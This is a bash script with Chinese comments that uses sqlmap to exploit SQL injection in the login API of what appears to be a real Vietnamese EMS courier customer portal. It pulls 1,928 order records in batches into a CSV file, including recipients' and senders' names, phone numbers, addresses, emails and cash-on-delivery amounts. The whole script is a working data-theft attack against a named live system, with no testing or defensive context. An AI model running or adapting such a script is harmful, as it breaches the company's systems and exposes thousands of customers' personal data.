#!/bin/bash
# 批量导出10号完整订单数据 - 包含所有金额、商品、运费信息

OUTPUT_FILE="/workspace/订单_20251010_完整信息.csv"

echo "🚀 开始导出10号完整订单数据..."
echo "目标：1,928条有金额的订单"
echo ""

# CSV表头 - 30个核心字段
echo "MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,DIACHI,NGUOIGUI,DIENTHOAIGUI,DIACHIGUI,KHOILUONG,SOKIEN,LOAI_HANG_HOA,SO_TIEN_THU_HO,CUOC_COD,CUOC_PHAI_THU,CUOC_PHAI_CHI,TIEN_PHAI_THU,TIEN_PHAI_CHI,CUOC_CHINH_PUBLIC,CUOC_DV_PUBLIC,CUOC_GIAM_PUBLIC,LE_PHI_HQ,THUE_NK,THUE_VAT,TRANGTHAI,DVU,LOAI,MAKH,CHANNEL,EMAIL_GUI,EMAIL_NHAN" > $OUTPUT_FILE

# 分20批，每批100条
for i in {1..20}; do
  start=$(( ($i-1)*100 + 1 ))
  end=$(( $i*100 ))
  
  echo "[$i/20] 提取订单 $start-$end ..."
  
  python3 /tmp/sqlmap-git/sqlmap.py \
    -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
    --data '{"Username":"*","Password":"test"}' \
    --method POST \
    -H "Content-Type: application/json" \
    --dbms=Oracle --batch --random-agent --delay=1 --timeout=180000 \
    --sql-query="SELECT MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,SUBSTR(DIACHI,1,50),NGUOIGUI,DIENTHOAIGUI,SUBSTR(DIACHIGUI,1,50),KHOILUONG,SOKIEN,LOAI_HANG_HOA,SO_TIEN_THU_HO,CUOC_COD,CUOC_PHAI_THU,CUOC_PHAI_CHI,TIEN_PHAI_THU,TIEN_PHAI_CHI,CUOC_CHINH_PUBLIC,CUOC_DV_PUBLIC,CUOC_GIAM_PUBLIC,LE_PHI_HQ,THUE_NK,THUE_VAT,TRANGTHAI,DVU,LOAI,MAKH,CHANNEL,EMAIL_GUI,EMAIL_NHAN FROM (SELECT MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,DIACHI,NGUOIGUI,DIENTHOAIGUI,DIACHIGUI,KHOILUONG,SOKIEN,LOAI_HANG_HOA,SO_TIEN_THU_HO,CUOC_COD,CUOC_PHAI_THU,CUOC_PHAI_CHI,TIEN_PHAI_THU,TIEN_PHAI_CHI,CUOC_CHINH_PUBLIC,CUOC_DV_PUBLIC,CUOC_GIAM_PUBLIC,LE_PHI_HQ,THUE_NK,THUE_VAT,TRANGTHAI,DVU,LOAI,MAKH,CHANNEL,EMAIL_GUI,EMAIL_NHAN,ROWNUM as RN FROM EMS.E1E2_PH WHERE NGAY='20251010' AND (SO_TIEN_THU_HO > 0 OR CUOC_PHAI_THU > 0)) WHERE RN BETWEEN $start AND $end" \
    2>&1 | grep "^\\[\\*" | sed 's/^\\[\\*\\] //' >> $OUTPUT_FILE
  
  # 显示进度
  current_lines=$(wc -l < $OUTPUT_FILE)
  echo "  ✅ 当前已导出: $current_lines 行"
  
  sleep 2
done

echo ""
echo "🎉 导出完成！"
echo "文件: $OUTPUT_FILE"
echo "总行数: $(wc -l < $OUTPUT_FILE)"
echo ""
echo "前5行预览："
head -5 $OUTPUT_FILE
